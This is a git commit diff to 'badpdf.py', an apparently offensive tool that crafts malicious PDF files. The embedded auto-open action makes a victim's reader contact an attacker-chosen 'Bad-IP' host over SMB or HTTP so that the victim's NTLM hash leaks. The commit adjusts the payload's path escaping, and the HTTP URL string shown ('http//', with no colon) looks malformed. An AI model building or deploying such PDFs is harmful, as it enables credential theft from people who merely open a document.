3de2f105ebea19e76bcb7c56b3ca2a371c35a9bb
Deepu TV <deeputv@gmail.com>
2018-05-02 20:32:56 +0300

    Fixed additional back slash issue in HTTP pdf creation

--- badpdf.py
+++ badpdf.py
@@ -54,7 +54,7 @@ startxref
 
    /AA <<
 	   /O <<
-	      /F (\\\\''' + host + '''\\test)
+	      /F (''' + host + '''test)
 		  /D [ 0 /Fit]
 		  /S /GoToE
 		  >>
@@ -127,7 +127,7 @@ if __name__ == "__main__":
         method = raw_input("How you want to send NTLM hash to Bad-IP?\n[1] Over SMB:\n\n[2] Over HTTP\n\n Option > ")
 
         if method == '1':
-            create_malpdf(filename, '\\' + '\\' + host + '\\')
+            create_malpdf(filename, '\\\\' + '\\\\' + host + '\\')
 
         elif method == '2':
             create_malpdf(filename, 'http//' + host + '/')
